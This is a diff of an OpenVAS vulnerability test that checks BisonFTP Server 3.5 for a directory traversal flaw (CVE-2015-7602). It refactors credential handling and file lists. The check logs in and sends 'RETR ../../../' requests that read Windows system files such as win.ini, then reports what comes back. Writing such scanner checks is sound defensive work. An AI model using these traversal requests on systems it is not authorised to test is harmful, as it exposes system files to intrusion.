@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bisonware_bisonftp_server_dir_trav_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
+# $Id: gb_bisonware_bisonftp_server_dir_trav_vuln.nasl 13497 2019-02-06 10:45:54Z cfischer $
 #
 # BisonWare BisonFTP Server Directory Traversal Vulnerability
 #
@@ -29,11 +29,12 @@ CPE = "cpe:/a:bisonware:bison_ftp_server";
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805753");
-  script_version("$Revision: 11872 $");
+  script_version("$Revision: 13497 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:45:54 +0100 (Wed, 06 Feb 2019) $");
   script_tag(name:"creation_date", value:"2015-09-29 12:41:58 +0530 (Tue, 29 Sep 2015)");
+  script_cve_id("CVE-2015-7602");
   script_name("BisonWare BisonFTP Server Directory Traversal Vulnerability");
 
   script_tag(name:"summary", value:"This host is running BisonWare BisonFTP Server
@@ -52,8 +53,8 @@ if (description)
   script_tag(name:"affected", value:"BisonWare BisonFTP Server version 3.5.");
 
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
-Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
@@ -64,48 +65,37 @@ General solution options are to upgrade to a newer release, disable respective f
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl", "gb_bisonware_bisonftp_server_detect.nasl");
+  script_dependencies("gb_bisonware_bisonftp_server_detect.nasl");
   script_mandatory_keys("BisonWare/Ftp/Installed");
   script_require_ports("Services/ftp", 21);
   exit(0);
 }
 
-
 include("ftp_func.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 ftpPort = get_app_port(cpe:CPE);
 if(!ftpPort){
   exit(0);
 }
 
-## create the socket
 soc = open_sock_tcp(ftpPort);
 if(!soc){
   exit(0);
 }
 
-user = get_kb_item("ftp/login");
-password = get_kb_item("ftp/password");
+kb_creds = ftp_get_kb_creds();
+user = kb_creds["login"];
+pass = kb_creds["pass"];
 
-## if not user name is given try with anonymous
-if(!user){
-  user = "anonymous";
-}
-
-## if not password is given try with anonymous
-if(!password){
-  password = string("anonymous");
-}
-
-login_details = ftp_log_in(socket:soc, user:user, pass:password);
+login_details = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!login_details)
 {
  close(soc);
  exit(0);
 }
 
-## Change to PASV Mode
 ftpPort2 = ftp_get_pasv_port(socket:soc);
 if(!ftpPort2)
 {
@@ -113,7 +103,6 @@ if(!ftpPort2)
   exit(0);
 }
 
-## Open a Socket and Send Crafted request
 soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
 if(!soc2)
 {
@@ -121,20 +110,21 @@ if(!soc2)
   exit(0);
 }
 
-## List the possible system files
-files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
-foreach file (files)
-{
+files = traversal_files( "Windows" );
+
+foreach pattern( keys( files ) ) {
+
+  file = files[pattern];
   file = "../../../" + file;
-  attackreq = string("RETR ", file);
-  send(socket:soc, data:string(attackreq, "\r\n"));
+  req = string("RETR ", file);
+  send(socket:soc, data:string(req, "\r\n"));
 
-  result = ftp_recv_data(socket:soc2);
+  res = ftp_recv_data(socket:soc2);
 
-  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
-                                     || "[boot loader]" >< result)
-  {
-    security_message(port:ftpPort);
+  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
+    report  = "Used request:  " + req + '\n';
+    report += "Received data: " + match;
+    security_message(port:ftpPort, data:report);
     close(soc2);
     close(soc);
     exit(0);
